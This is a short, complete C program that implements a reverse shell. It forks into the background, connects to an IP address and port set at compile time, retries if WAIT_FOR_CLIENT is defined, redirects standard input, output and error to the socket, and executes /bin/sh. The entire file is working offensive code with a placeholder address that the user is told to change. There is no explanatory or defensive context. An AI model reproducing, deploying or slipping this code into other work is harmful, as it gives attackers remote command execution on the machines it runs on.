#include <sys/socket.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ================================================== */
/* |     CHANGE THIS TO THE CLIENT IP AND PORT      | */
/* ================================================== */
#if !defined(CLIENT_IP) || !defined(CLIENT_PORT)
# define CLIENT_IP "0.0.0.0"
# define CLIENT_PORT (int)0
#endif
/* ================================================== */

void rsh(void) {
	if (strcmp(CLIENT_IP, "0.0.0.0") == 0 || CLIENT_PORT == 0) {
		write(2, "[ERROR] CLIENT_IP and/or CLIENT_PORT not defined.\n", 50);
		exit(1);
	}

	pid_t pid = fork();
	if (pid == -1) {
		write(2, "[ERROR] fork failed.\n", 21);
		exit(1);
	}
	if (pid > 0) {
		exit(0);
	}

	int port = CLIENT_PORT;
	struct sockaddr_in sa;
	int sockt = socket(AF_INET, SOCK_STREAM, 0);
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = inet_addr(CLIENT_IP);

#ifdef WAIT_FOR_CLIENT
	while (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		sleep(5);
	}
#else
	if (connect(sockt, (struct sockaddr *) &sa, sizeof(sa)) != 0) {
		write(2, "[ERROR] connect failed.\n", 24);
		exit(1);
	}
#endif

	dup2(sockt, 0);
	dup2(sockt, 1);
	dup2(sockt, 2);
	char * const argv[] = {"/bin/sh", NULL};
	execve("/bin/sh", argv, NULL);
}

int main(void) {
	rsh();
	return (0);
}